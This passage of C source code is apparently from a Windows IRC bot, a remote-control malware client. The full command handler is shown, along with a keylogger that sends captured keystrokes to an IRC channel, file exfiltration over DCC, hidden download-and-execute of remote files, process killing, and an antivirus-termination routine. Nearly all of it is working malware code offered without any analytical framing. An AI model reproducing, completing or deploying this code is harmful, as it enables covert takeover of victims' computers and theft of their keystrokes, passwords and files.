		sprintf(buffer,"JOIN %s %s",HomeChan,ChanPass);
		strcpy(curchan,HomeChan);
	}

	if(strncmp("47",arg[1],2)==0   && 
	    strcmp(arg[4],":Cannot")==0 || 
	     strncmp("46",arg[1],2)==0   && 
	      strcmp(arg[4],":Cannot")==0 || 
	       strncmp("48",arg[1],2)==0   && 
	        strcmp(arg[4],":Cannot")==0){
		
		if(strcmp(BacChan,arg[3])==0)
			Connect((char*)shost,sPort);
		else 
			sprintf(buffer,"JOIN %s %s",BacChan,ChanPass);
			 strcpy(curchan,BacChan);
	}

	if((&arg[5][1]) != NULL){

		if(strcmp("353",arg[1])==0 
			&& (strcmp(arg[4],HomeChan)==0 
			|| strcmp(arg[4],BacChan)==0 )
			&& strncmp(&arg[5][1],"@",1) == 0)

			sprintf(buffer,"MODE %s +ntsk %s",arg[4],Botpwd);
	}

	if(arg[2] != NULL && strcmp(arg[1],"PART") == 0 ||
						 strcmp(arg[1],"QUIT") == 0)
	 {
		 if(CheckMaster(cNick(arg[0]))
			 && strcmp(arg[2],HomeChan) ==  0 
			 || strcmp(arg[2],BacChan)  ==  0)
			 ClearUsers(cNick(arg[0]));
	 }
 
	if(arg[3] != NULL)
	{
	
  	  if (strcmp(arg[3],":\1VERSION\1") == 0)
	  {
	   	   strcpy(nick,cNick(arg[0]));
		    sprintf(buffer,"PRIVMSG %s :\1VERSION %s\1",nick,
			  "mIRC v6.16 Khaled Mardam-Bey");
	  }

	 if (strcmp(arg[3],":\1PING") == 0 && arg[4] != NULL) 
	 {
		  strcpy(nick,cNick(arg[0]));
		   sprintf(buffer,"PRIVMSG %s :\1PING %s",nick,arg[4]);
	 }

	 if(strcmp(arg[1],"KICK")==0)
	 {
		if(strcmp(arg[3],mynick) == 0)
			 sprintf(buffer,"JOIN %s",arg[2]);

		if(CheckMaster(arg[3]))ClearUsers(arg[3]);
	}
	

	 if(strcmp(arg[1],"KILL")==0 && strcmp(arg[2],mynick)==0)main();

	if((arg[7]) != NULL){

		if(strcmp(":\1DCC",arg[3]) == 0 && strcmp(arg[4],"RESUME") != 0)
		{

		for(i = 0;i < maxlogins;i++)
			
			if(CheckMaster(cNick(arg[0])))
			{
				
				memset(dccfilename,0,sizeof(dccfilename));
				memset(dcchost,0,sizeof(dcchost));

				dcchosts = sock;

				strcpy(sendtochan,cNick(arg[0])); 
				strcpy(dccfilename,arg[5]);
				strcpy(dcchost,arg[6]);

				dccport = atoi(arg[7]);

				CreateThread(NULL, 0, &dcc_getfile, NULL, 0, &id);
			}
		}
	}

	 if(arg[4] != NULL)
	 {

	   if(strcmp((char*)arg[1],"PRIVMSG")	 == 0	 && 
		  (strcmp((char*)arg[2],HomeChan)	 == 0	 || 
		    strcmp((char*)arg[2],BacChan)    == 0    || 
		     strcmp(arg[2],mynick)			 == 0)	 && 
		      strncmp(&arg[3][1],Prefix,1)   == 0    && 
		       strcmp(&arg[3][2],"login")    == 0    && 
		        strcmp((char*)arg[4],Botpwd) == 0)	 
		 {

			   if(CheckMaster(cNick(arg[0])))return 1;

				for(i = 0;i < maxlogins;i++)
				{
					 memset(buffer,0,512);

			   		if(logins[i][0] != '\0') 

						if(i == maxlogins - 1)
						{
							privmsg(sock,"\2-> I cant handle more users\15",arg[2]);
							break;
						}
							else continue;

					if (strcmp((char*)arg[4],Botpwd) == 0) 
					{
						 strcpy(logins[i],cNick(arg[0]));
						 privmsg(sock,"-> Password accepted",curchan);
						 break;
					}
				}
			}
		}

 if(arg[3] != NULL)
 {
	 if(strcmp((char*)arg[1],"PRIVMSG")   == 0)
	  {
	   if(strcmp((char*)arg[2],HomeChan) == 0)

			strcpy(curchan,HomeChan);
	   else

		 if(strcmp((char*)arg[2],BacChan)  == 0)

			 strcpy(curchan,BacChan);
		 else

		 if(strcmp((char*)arg[2],mynick)==0)

				strcpy(curchan,cNick(arg[0]));
		 else return 1;

			   if(CheckMaster(cNick(arg[0]))&& strncmp(&arg[3][1],Prefix,1)==0)
			   {
				 /*  for(i = 0;(unsigned)i < strlen(&arg[3][0]);i++)
					   if(arg[3][i] == ':'){
						   strcpy(command,&arg[3][i+2]);
						   break;
					   }*/

					 strcpy(command,&arg[3][2]);

				   if(strcmp(op_cmd,command) == 0)
					   sprintf(buffer,"MODE %s +o %s",arg[4],arg[5]);
				   
				   if(strcmp(deop_cmd,command) == 0)
					   sprintf(buffer,"MODE %s -o %s",arg[4],arg[5]);
				   
				   if(strcmp(v_cmd,command) == 0)
					   sprintf(buffer,"MODE %s +v %s",arg[4],arg[5]);
				   
				   	if(strcmp(vn_cmd,command) == 0)
					   sprintf(buffer,"MODE %s -v %s",arg[4],arg[5]);
				   
				   if(strcmp(kick_cmd,command)==0)
					   sprintf(buffer,"KICK %s %s %s",arg[4],arg[5],arg[6]);

				   	if(strcmp(ban_cmd,command)==0) // ban + kick :)
						sprintf(buffer,"MODE %s +b %s\nKICK %s %s",arg[4],arg[5],arg[4],arg[5]);
			
					if(strcmp(unban_cmd,command)==0)
					   sprintf(buffer,"MODE %s -b %s",arg[4],arg[5]);

					if(strcmp(join_cmd,command)==0)
						sprintf(buffer,"JOIN %s",arg[4]);

					if(strcmp(logout_cmd,command)==0)
						ClearUsers(cNick(arg[0]));

					if(strcmp(part_cmd,command)==0)
						sprintf(buffer,"PART %s",arg[4]);

					if (strcmp(hop_cmd, command) == 0) 
							sprintf(buffer,"PART %s \r\n JOIN %s %s",arg[4],arg[4],arg[5]);

					if (strcmp(reco_cmd, command) == 0) {
						 ClearUsers("");
						   irc_send(sock, "QUIT :reconnecting");
							main();
					}
					
					if (strcmp(rndn_cmd, command) == 0) {
						sprintf(buffer,"NICK %s",rndnick(nick));
						 strcpy(mynick,nick);
					}
					
					if (strcmp(die_cmd, command) == 0)exit(0);

					if(strcmp(raw_cmd,command)==0)
					{
						memset(buffer,0,512);

							for(i = 4;arg[i];i++)
						{
								strcat(buffer," ");
								strcat(buffer,arg[i]);
						}
					}
							
						//-------------------------------------------
					if (strcmp(ver_cmd, command) == 0)
						privmsg(sock,(char*)bver,curchan);

					if (strcmp(sys_cmd, command) == 0)
						privmsg(sock,sysinfo(buff),curchan);


					if(strcmp(status_cmd,command) ==0 )
					{
						total = (GetTickCount() / 1000) - started;
						days = total / 86400;
						hours = (total % 86400) / 3600;
					 	minutes = ((total % 86400) % 3600) / 60;
					    sprintf(buffer, "PRIVMSG %s :\2-> Online for: %dd %dh %dm\15",curchan,days, hours, minutes);
					}
					
					if(strcmp(dns_cmd,command) == 0)
						sprintf(buffer,"PRIVMSG %s :-> %s Resolved to \2-> %s <-\15",curchan,command,DNS(arg[4]));

					if(strcmp(listf_cmd,command) == 0)
					{
						strcpy(lst.dir,arg[4]);
						 lst.sock = sock;
						 strcpy(lst.who,curchan);
						CreateThread(NULL, 0, &ListF, &lst, 0, &id);
					}

					if(strcmp(dccget_cmd,command) == 0)
					{
						dcchosts = sock;
						strcpy(sendtochan,cNick(arg[0]));
						strcpy(dccfilename,arg[4]);

						CreateThread(NULL, 0, &dcc_send, NULL, 0, &id);
					}

					if(strcmp(process_cmd,command) == 0)
					{
						lsock = sock;
						 strcpy(pwho,curchan);
						CreateThread(NULL,0,&ListP,NULL,0,&id);
					}

					if(strcmp(killp_cmd,command) == 0)
						KillProcess(arg[4],0);
					
					if(strcmp(listd_cmd,command) == 0)
						ListD(sock);

					if(strcmp(run_cmd,command) == 0)
					
						if(arg[6] != NULL)
							Run(sock,arg[4],arg[5],arg[6]);
						else
							Run(sock,arg[4],arg[5],"");

					if(strcmp(md_cmd,command) == 0)
						if (!CreateDirectory(arg[4],0)) strcpy(buffer,no_cmd);
		
					if(strcmp(rd_cmd,command) == 0)
						if (!RemoveDirectory(arg[4])) strcpy(buffer,no_cmd);

					if(strcmp(del_cmd,command) == 0)
						if (!DeleteFile(arg[4])) strcpy(buffer,no_cmd);

					if(strcmp(ren_cmd,command) == 0)
						if (MoveFile(arg[4],arg[5])) strcpy(buffer,no_cmd);
					
					if(strcmp(thr_cmd,command) == 0)
					{
					  for (i=0;i <= 40;i++) {
						 if (threads[i].id != 0) {
							sprintf(buffer,"%i: %s\n",i,threads[i].name);
								privmsg(sock,buffer,curchan);
						  	 Sleep(flood);
							}
						}
					  memset(buffer,0,sizeof(buffer));
					}

					if(strcmp(killthr_cmd,command) == 0)
					{
						t = atoi(arg[4]);

						if (t > 39) return 0;
						 if (threads[t].id != 0) {
							 if (TerminateThread(threads[t].Threat_Handle,0) == 0) strcpy(buffer,no_cmd);
							  else {
								sprintf(buffer,"Thread killed (%s)",threads[t].name);
								privmsg(sock,buffer,curchan);
							   closesocket(threads[t].sock);
							 threads[t].id = 0;
							}
						}
					 memset(buffer,0,sizeof(buffer));
					}

					if(strcmp(keylogg_cmd,command) == 0)
					{
						keysock = sock;
						sendkeysto = 1;
					}

					if(strcmp(keystop_cmd,command) == 0)
						sendkeysto = 0;	

					if(strcmp(delay_cmd,command) == 0)
					{
						sec = atoi(arg[4]);

						for(i = 0;arg[i] != NULL;i++)
						{
							if(i <= 2)
							{
							  strcat(buffer,arg[i]);
							  strcat(buffer," ");

							  if(i == 2)strcat(buffer," :");
							}
							else if(i >= 5)
							{
								strcat(buffer,arg[i]);
								strcat(buffer," ");
							}
						}

						for(i = 0;i < sec;i++)
						{
							Sleep(1000);
							strcpy(buff,buffer);
							Split(sock,buff,mynick);
						}

						memset(buffer,0,512);
					}

					if(strcmp(download_cmd,command) == 0 && arg[6] != NULL)
					{
						Downs.sock = sock;

						strcpy(Downs.web,arg[4]);
						strcpy(Downs.Path,arg[5]);
						strcpy(Downs.Run,arg[6]);

						Threat_Handle = CreateThread(NULL, 0, &Download, NULL, 0, &id);

						addthread("Download",0,Threat_Handle,1,"\0");

					}

					if(strcmp(msg_cmd,command) == 0)
					{
						for(i = 5;arg[i] != NULL;i++)
						{
							  strcat(buffer," ");
							  strcat(buffer,arg[i]);
						}

						privmsg(sock,buffer,arg[4]);
						memset(buffer,0,512);
					}
 
					if(strcmp(notice_cmd,command) == 0)
					{
						for(i = 5;arg[i] != NULL;i++)
						{
							  strcat(buffer," ");
							  strcat(buffer,arg[i]);

						}

						privmsg(sock,buffer,arg[4]);
						sprintf(buff,"NOTICE %s :%s",arg[4],buffer);
					
						irc_send(sock,buff);
						
						memset(buffer,0,512);
						memset(buff,0,512);

					}
				}
			}
		}        
	}

		irc_send(sock, buffer);
  return 0;
}

char* cNick(char *str)
{
	static char nick[16];
	char * p = nick;

	 str++; 

	while((*p=*str) && *str!='!' && *str)
	{ p++;str++; }


	*p = 0;

	return nick;
}

char *cHost(char *str)
{
  char *p;
  char buffer[64] = {0};

    p = strtok(str,"!");
   
    p = p+strlen(p++);

    return p;
}

void Connect(char *server,int port)
{
	ircs birc;
			strcpy(birc.host,shost); 
			strcpy(birc.rnick,rndnick(birc.rnick)); 
			strcpy(birc.chan ,HomeChan); 
			strcpy(birc.chpass,ChanPass); 
			strcpy(birc.hchan,BacChan);
			birc.port = sPort;
			irc_connect(&birc);
}

//=============================Stufs needed================================
 char * sysinfo(char *sinfo)
 {
	int total;
	char *os;
	char os2[140];

	MEMORYSTATUS memstat;
	OSVERSIONINFO verinfo;

	GlobalMemoryStatus(&memstat); // load memory info into memstat
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); // required for some strange reason
	GetVersionEx(&verinfo); // load version info into verinfo


	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = "2003";
	else os = "??";

	if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0] != '\0') {
		sprintf(os2, "%s [%s]", os, verinfo.szCSDVersion);
		os = os2;
	}

	total = GetTickCount() / 1000; // GetTickCount() / 1000 = seconds since os started.

	sprintf(sinfo, "-> CPU: %I64uMHz -> RAM: %dKB total, %dKB free -> OS: Windows %s [%d.%d, build %d] -> Uptime: %dd %dh %dm",
		cpuspeed(), memstat.dwTotalPhys / 1024, memstat.dwAvailPhys / 1024,
		os, verinfo.dwMajorVersion, verinfo.dwMinorVersion, verinfo.dwBuildNumber, total / 86400, (total % 86400) / 3600, ((total % 86400) % 3600) / 60);
	return sinfo; // return the sysinfo string
 }


// cpu speed function
 unsigned __int64 cpuspeed(void)
 {
	unsigned __int64 startcycle;
	unsigned __int64 speed, num, num2;

	do {
		startcycle = cyclecount();
		Sleep(1000);
		speed = ((cyclecount()-startcycle)/100000)/10;
	} while (speed > 1000000); // if speed is 1000GHz+, then something probably went wrong so we try again =P

	// guess 'real' cpu speed by rounding raw cpu speed (something like 601mhz looks kinda tacky)
	num = speed % 100;
	num2 = 100;
	if (num < 80) num2 = 75;
	if (num < 71) num2 = 66;
	if (num < 55) num2 = 50;
	if (num < 38) num2 = 33;
	if (num < 30) num2 = 25;
	if (num < 10) num2 = 0;
	speed = (speed-num)+num2;

	return speed;
 }

// asm for cpuspeed() (used for counting cpu cycles)
 #pragma warning( disable : 4035 )
 unsigned __int64 cyclecount(void)
 {
 	#if defined (__LCC__) // this code is for lcc
	unsigned __int64 count = 0;
	_asm ("rdtsc\n"
		  "mov %eax,%count\n");
	return count;

	#elif defined (__GNUC__) // this code is for GCC
	unsigned __int64 count = 0;
	__asm__ ("rdtsc;movl %%eax, %0" : "=r" (count));
	return count;

	#else // this code is for MSVC, may work on other compilers (ignore the warnings, MSVC is stupid...)
	_asm {
		_emit 0x0F;
		_emit 0x31;
	}
	#endif
 }

DWORD WINAPI ListF(LPVOID param)
{
	char sendbuf[MAX_PATH];
	char parent[MAX_PATH];
    int  count = 0;
	int  count2 = 0;	

	HANDLE Hnd;
    WIN32_FIND_DATA WFD;

	lpt fls;
	lpt *lst = (lpt *)param;
	fls = *((lpt *)param);

	if(strlen(fls.dir) >=3)
	{


	memset(parent,0,sizeof(parent));

	sprintf(sendbuf,"S: %s",fls.dir);

	privmsg(fls.sock,sendbuf,fls.who);

        Hnd = FindFirstFile(fls.dir, &WFD);

        while (FindNextFile(Hnd, &WFD))
        {
        	if ((WFD.dwFileAttributes) &&  (strcmp(WFD.cFileName, "..") && strcmp(WFD.cFileName, ".")))
        	{

			memset(sendbuf,0,sizeof(sendbuf));
		
			if (WFD.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				count2++;
				sprintf(sendbuf,"<%s>",WFD.cFileName);
				privmsg(fls.sock,sendbuf,fls.who);
			}
			else {
				count++;
				sprintf(sendbuf,"%s  (%i bytes)\r\n",WFD.cFileName,WFD.nFileSizeLow);
				privmsg(fls.sock,sendbuf,fls.who);
			}
			if (fls.who) Sleep(flood);
     		}

      }
    	FindClose(Hnd);
	sprintf(sendbuf,"Found: %i files and %i dirs",count,count2);
	privmsg(fls.sock,sendbuf,fls.who);
}
   	return 0;
}

DWORD WINAPI dcc_getfile(LPVOID param)
{
	char buffer[4096];
	char sendbuffer[512];
	char chan[50];
	char host[20];
	char sysdir[MAX_PATH];
	char filename[MAX_PATH];

	DWORD err;
   	SOCKET	dcc;
	SOCKET	sock;
	FILE *infile;
	HANDLE testfile;

	int port;
	int received = 0;
	unsigned long received2;

	sock = dcchosts;
	
	strcpy(chan,sendtochan);
	
	port = dccport;
 	
	sprintf(host,dcchost);
	
	GetSystemDirectory(sysdir, sizeof(sysdir));
	
	sprintf(filename,"%s\\%s",sysdir,dccfilename);
	
	
	memset(sendbuffer,0,sizeof(sendbuffer));
	
	while (1) 
	{
		testfile = CreateFile(filename,GENERIC_WRITE,FILE_SHARE_READ,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
	
	/*	if (testfile == INVALID_HANDLE_VALUE) {
			sprintf(sendbuffer,"Error with file");
			break;
		}*/

		CloseHandle(testfile);
		infile = fopen(filename,"a+b");
		
		if (infile == NULL) {
			sprintf(sendbuffer,"Error with file");
			break;
		}

		if ((dcc = create_sock(host,port)) == SOCKET_ERROR) {
			sprintf(sendbuffer,"Error connecting");
			break;
		}
		err = 1;
		while (err != 0) {
			memset(buffer,0,sizeof(buffer));
			err = recv( dcc, buffer, sizeof(buffer), 0);
			if (err == 0) break;
			if (err == SOCKET_ERROR) {
				dccsenderror(sock,chan,"Socket error");
				fclose(infile);
				closesocket(dcc);
				return 1;
			}
			fwrite(buffer,1,err,infile);
			received = received + err;
			received2 =  htonl(received);
			send(dcc,(char *)&received2 , 4, 0);
		}
		sprintf(sendbuffer,"Transfer complete (size: %i bytes)",received);
		break;
	}
	dccsenderror(sock,chan,sendbuffer);
	if (infile != NULL) fclose(infile);
	closesocket(dcc);
	return 0;

}


SOCKET create_sock(char *host, int port)
{
    LPHOSTENT lpHostEntry = NULL;
   	SOCKADDR_IN  SockAddr;
   	SOCKET sock;
   	IN_ADDR iaddr;

   	if ((sock = socket( AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
      		return -1;
	memset(&SockAddr, 0, sizeof(SockAddr));
   	SockAddr.sin_family = AF_INET;
   	SockAddr.sin_port = htons((short)port);
	iaddr.s_addr = inet_addr(host);
	if (iaddr.s_addr == INADDR_NONE)  lpHostEntry = gethostbyname(host); //hostname
	if (lpHostEntry == NULL && iaddr.s_addr == INADDR_NONE)  //error dns
		return -1;
	if (lpHostEntry != NULL)
		SockAddr.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list); //hostname
	else
		SockAddr.sin_addr = iaddr; //ip address
	if (connect(sock, (SOCKADDR *) &SockAddr, sizeof(SockAddr)) == SOCKET_ERROR) {
		closesocket(sock);
		return -1;
	}
	return sock;
}

DWORD WINAPI dcc_send(LPVOID param)
{
	char buffer[1024];
	char chan[50];	
	char filename[MAX_PATH];
	char sendbuf[512]; 
	char file[MAX_PATH];
	char ip[32];
	int length;
	unsigned int move;
	UINT c;
	int addrlen;
	int Fsend;
	int bytes_sent;
	int sas;
	short portnum;

	DWORD err2;
	DWORD mode = 0;
   	SOCKET         dcc;
	SOCKET         sock;
	SOCKET sendsock;
	SOCKADDR_IN    GuestAddr;
	SOCKADDR_IN    SockAddr;
	HANDLE testfile;
	TIMEVAL time;
   	fd_set fd_struct;
	SOCKADDR sa;

	sas = sizeof(sa);
	memset(&sa, 0, sizeof(sa));
	getsockname(dcchosts, &sa, &sas);

	wsprintf(ip, "%d.%d.%d.%d", (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);

	memset(chan,0,sizeof(chan));
	strcpy(chan,sendtochan);

	sendsock = dcchosts;
	strcpy(filename,dccfilename);
 
	memset(sendbuf,0,sizeof(sendbuf));

	while (1) 
	{
		if ((dcc = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) 
			break;
		
		memset(&SockAddr, 0, sizeof(SockAddr));
   		SockAddr.sin_family = AF_INET;
   		SockAddr.sin_port = htons(0);//random port
		SockAddr.sin_addr.s_addr = INADDR_ANY;   
	
		if (bind(dcc, (SOCKADDR *)&SockAddr, sizeof(SockAddr)) != 0) 
			break;
		

		length = sizeof(SockAddr);
		getsockname(dcc, (SOCKADDR *)&SockAddr, &length);

		portnum = ntohs(SockAddr.sin_port);

		for (c=0;c<=strlen(filename);c++)
		{
			if (filename[c] == 32) file[c] = 95;
			else file[c] = filename[c];
		}

		if (listen(dcc, 1) != 0) 
			break;
		
		testfile = CreateFile(filename,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
		if (testfile == INVALID_HANDLE_VALUE) 
			
			break;
		

		length = GetFileSize(testfile,NULL);

		sprintf(sendbuf,"\1DCC SEND %s %i %i %i\1\r",file,htonl(inet_addr(ip)),portnum,length);
		dccsenderror(sendsock,chan,sendbuf);

    		time.tv_sec = 60;//timeout after 60 sec.
    		time.tv_usec = 0;
   		FD_ZERO(&fd_struct);
    		FD_SET(dcc, &fd_struct);
	
			if (select(0, &fd_struct, NULL, NULL, &time) <= 0)
		{
			dccsenderror(sendsock,chan,"Dcc send timeout");
			break;
		}

		addrlen = sizeof(GuestAddr);
		
		if ((sock = accept(dcc, (SOCKADDR *)&GuestAddr,&addrlen)) == INVALID_SOCKET)  
			break;
		
		closesocket(dcc);

		while (length) {
			Fsend = 1024;
			memset(buffer,0,sizeof(buffer));
			if (Fsend>length) Fsend=length;
			move = 0-length;
			SetFilePointer(testfile, move, NULL, FILE_END);
			ReadFile(testfile, buffer, Fsend, &mode, NULL);
			bytes_sent = send(sock, buffer, Fsend, 0);
			err2 = recv(sock,buffer ,sizeof(buffer), 0);
			if (err2 < 1 || bytes_sent < 1) {
				dccsenderror(sendsock,chan,"Socket error");
				closesocket(sock);
				return 1;
			}
			length = length - bytes_sent;
		}

		if (testfile != INVALID_HANDLE_VALUE)
					CloseHandle(testfile);
	
		memset(sendbuf,0,sizeof(sendbuf));
		sprintf(sendbuf,"Transfer complete");
		break;
	}
	
	dccsenderror(sendsock,chan,sendbuf);
	
	if (dcc > 0) 
		closesocket(dcc);

	closesocket(sock);
  return 0;
}

int dccsenderror(SOCKET sock,char *chan,char *buf)
{
	char buffer[512];
	strcat(buf,"\n");
	memset(buffer,0,sizeof(buffer));
	if (chan) sprintf(buffer,"PRIVMSG %s :%s",chan,buf);
	else sprintf(buffer,buf);
	send(sock,buffer,strlen(buffer),0);
	return 0;
}

DWORD WINAPI ListP(LPVOID param)
{
	HANDLE hProcList;
	PROCESSENTRY32 pe;
	BOOL bMoreProcesses;

	hProcList = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if(hProcList == 0)
		return 0;

	pe.dwSize = sizeof(PROCESSENTRY32);
	bMoreProcesses=Process32First(hProcList,&pe);

	while(bMoreProcesses)
		{
		if(pe.th32ProcessID != GetCurrentProcessId())
			Sleep(flood);
			privmsg(lsock,pe.szExeFile,pwho);

		pe.dwSize = sizeof(PROCESSENTRY32);
	bMoreProcesses=Process32Next(hProcList,&pe);
		}          
	privmsg(lsock,"[Process List finished]",pwho);

	return 0;
}

void KillProcess(char Process[256],BOOL AV)
{
  HANDLE Snap;
  HANDLE laris;
  PROCESSENTRY32 proc32;
  int c;

  Snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
 
  if(Snap==INVALID_HANDLE_VALUE)return;
 
  proc32.dwSize=sizeof(PROCESSENTRY32); 

  while((Process32Next(Snap,&proc32))==TRUE)
  {
	  laris = OpenProcess(PROCESS_TERMINATE, 0, proc32.th32ProcessID);

	  if(strcmp(Process,proc32.szExeFile) == 0)
	   {
		   TerminateProcess(laris,0);
			CloseHandle(laris);
			break;
	   }

   if(AV == TRUE)
	{
	  for(c=0;kill_list[c];c++)
	  {
	  
	   CharUpperBuff(proc32.szExeFile,strlen(proc32.szExeFile));
		  
		if((strstr(proc32.szExeFile,kill_list[c])) != NULL)
		  {
			      TerminateProcess(laris, 0);
				  CloseHandle(laris);
		  }
		}
	 }
  } 

  CloseHandle(Snap);

}

void ListD(SOCKET sock)
{
  char buf[4];
  char msg[32];
  char i;

  UINT dr_type;
 
	  for(i = 'a';i<='z';i++)
	{
		buf[0] = i;
		buf[1] = ':';
		buf[2] = '\0';

		dr_type = GetDriveType(buf);

	  if(dr_type == DRIVE_REMOVABLE)
	  { 
		sprintf(msg,"%s - DRIVE_REMOVABLE",buf);
		privmsg(sock,msg,curchan);
	  }
  
	  if(dr_type == DRIVE_FIXED)
	  {
		sprintf(msg,"%s - DRIVE_FIXED",buf);
		Sleep(flood);
		privmsg(sock,msg,curchan);
	  }
  

	  if(dr_type == DRIVE_REMOTE)
	  {
		sprintf(msg,"%s - DRIVE_REMOTE",buf);
		privmsg(sock,msg,curchan);
	  }

	}
}

void Run(SOCKET sock,char *file,char *param,char *what)
{
	if(strlen(what) > 0)
	{
	   if (!ShellExecute(0, "open",file, param, NULL, SW_SHOW))
			privmsg(sock,"Couldn't execute file.",curchan);
	   return;
	   }

	   if (!ShellExecute(0, "open",file, param, NULL, SW_HIDE))
			privmsg(sock,"Couldn't execute file.",curchan);
}


int addthread(char *name,SOCKET sock,HANDLE Threat_Handle,int id,char * dir)
{
	int c;

	for (c=0;c <= 40;c++)
		if (threads[c].id == 0) break;

	if (c > 19) return -1;

	sprintf(threads[c].name,name);
	threads[c].id = id;
	threads[c].num = c;
	threads[c].sock = sock;
	threads[c].Threat_Handle = Threat_Handle;
	sprintf(threads[c].dir,dir);
	return c;
}

DWORD WINAPI kill_av(LPVOID param)
{
	while (1) {

	//	KillProcess("",TRUE);
		Sleep(killer_delay);
	}
	return 0;
}


DWORD WINAPI keylogger(LPVOID Param)
{
	HWND win, winold;
	int bKstate[256]={0};
    int i,x;
	int err = 0;
	int threadnum = (int)Param;
	char buffer[600];
	char buffer2[800];
	char window[61];
	char date[70];
	int state;
	int shift;
	char logfile[MAX_PATH];
	char sysdir[MAX_PATH];
	FILE *log;

	GetSystemDirectory(sysdir, sizeof(sysdir));
//	sprintf(logfile,"%s\\%s",sysdir,keylogfilename);
	sprintf(logfile,"C:\\Log.txt");

	log = fopen(logfile,"aw");
	if (log != NULL) {

		GetDateFormat(0x409,0,0,"\n[dd:MMM:yyyy, ",date,70);
		fputs(date,log);
		memset(date,0,sizeof(date));
		GetTimeFormat(0x409,0,0," HH:mm:ss]",date,70);
		fputs(date,log);
		fputs(" Keylogger Started\n\n",log);
		fclose(log);
	}


	memset(buffer,0,sizeof(buffer));
	win = GetForegroundWindow();
	winold = win;
	GetWindowText(winold,window,60);

	while (err == 0) {
		Sleep(8);
		win = GetForegroundWindow();
		if (win != winold) {
			if (strlen(buffer) != 0) {
				sprintf(buffer2,"%s (Changed window",buffer);
				err = sendkeys(keysock,buffer2,window,logfile);
				memset(buffer,0,sizeof(buffer));
				memset(buffer2,0,sizeof(buffer2));
			}
			win = GetForegroundWindow();
			winold = win;
			GetWindowText(winold,window,60);

		}
		for(i=0;i<92;i++)
		{
			shift = GetKeyState(VK_SHIFT);
 			x = inputL[i];
			if (GetAsyncKeyState(x) & 0x8000) {
				//see if capslock or shift is pressed doesnt work most of the time on win9x
				if (((GetKeyState(VK_CAPITAL) != 0) && (shift > -1) && (x > 64) && (x < 91)))//caps lock and NOT shift
					bKstate[x] = 1;//upercase a-z
				else if (((GetKeyState(VK_CAPITAL) != 0) && (shift < 0) && (x > 64) && (x < 91)))//caps lock AND shift
					bKstate[x] = 2;//lowercase a-z
				else if (shift < 0) //Shift
					bKstate[x] = 3; //upercase
				else bKstate[x] = 4; //lowercase 
			}

			else {
				if (bKstate[x] != 0)
				{
					state = bKstate[x];
					bKstate[x] = 0;
					if (x == 8) {
						buffer[strlen(buffer)-1] = 0;
						continue;
					}
					else if (strlen(buffer) > 550) {
						win = GetForegroundWindow();
						GetWindowText(win,window,60);
						sprintf(buffer2,"%s (Buffer full",buffer);
						err = sendkeys(keysock,buffer2,window,logfile);
						memset(buffer,0,sizeof(buffer));
						memset(buffer2,0,sizeof(buffer2));
						continue;
					}
					else if (x == 13)  {
						if (strlen(buffer) == 0) continue;
						win = GetForegroundWindow();
						GetWindowText(win,window,60);
						sprintf(buffer2,"%s (Return",buffer);
						err = sendkeys(keysock,buffer2,window,logfile);
						memset(buffer,0,sizeof(buffer));
						memset(buffer2,0,sizeof(buffer2));
						continue;
					}
					else if (state == 1 || state == 3)
						strcat(buffer,outputH[i]);
					else if (state == 2 || state == 4)
						strcat(buffer,outputL[i]);
				}
     		}
		}
	}

	threads[threadnum].id = 0;
	return 1;
}

int sendkeys(SOCKET sock,char *buf,char *window,char *logfile)
{
	char buffer[4092];
	char date[20];
	int len = 0;
	int c;
	FILE *log;

	strcat(buf,")\n");

	log = fopen(logfile,"aw");

	if (log != NULL) {

		GetTimeFormat(0x409,0,0,"[HH:mm:ss] ",date,19);
		fputs(date,log);
		len = strlen(date) + strlen(window);
		fputs(window,log);
		len = 75 - len;
		
		if (len > 0) {
			for(c=0;c<len;c++)
				fputc(32,log);
		}

	 	fputs(buf,log);
		fclose(log);
	}

	if (sendkeysto == 0) return 0;

	strcat(buf,"\r");

	if (strlen(keylogchan) == 0) 
		sprintf(buffer,"(%s) .10 %s",window,buf);

	else 
		sprintf(buffer,"PRIVMSG %s :(%s).10  %s",keylogchan,window,buf);


		privmsg(sock,buffer,curchan);

	//	sendkeysto = 0;

	return 0;
}

int CheckNet()
{
	DWORD	Connected;

	ULONG FLAGS = INTERNET_CONNECTION_MODEM | 
	INTERNET_CONNECTION_LAN | 
	INTERNET_CONNECTION_PROXY;

	if(InternetGetConnectedState(&Connected, 0))
		return 1;

		return 0;
}

DWORD WINAPI Download(LPVOID param)
{
  //while(CheckNet != 1)Sleep(10000);

if(URLDownloadToFile(0, Downs.web,Downs.Path, 0, 0) == S_OK)
  {
	privmsg(Downs.sock,"Downloading in progress...",curchan);

	 if(strcmp(Downs.Run,"true") == 0)
		ShellExecute(NULL,"open",Downs.Path,NULL,NULL,SW_HIDE);

	 privmsg(Downs.sock,"File Downloaded",curchan);
	 
      ExitThread(0);
	 return 1;
  }
else
	privmsg(Downs.sock,"Cant Download File",curchan);
	 ExitThread(0);
  return 0;
}


#pragma comment(lib,"wininet.lib")
#pragma comment(lib,"wsock32.lib")
#pragma comment(lib,"kernel32.lib")
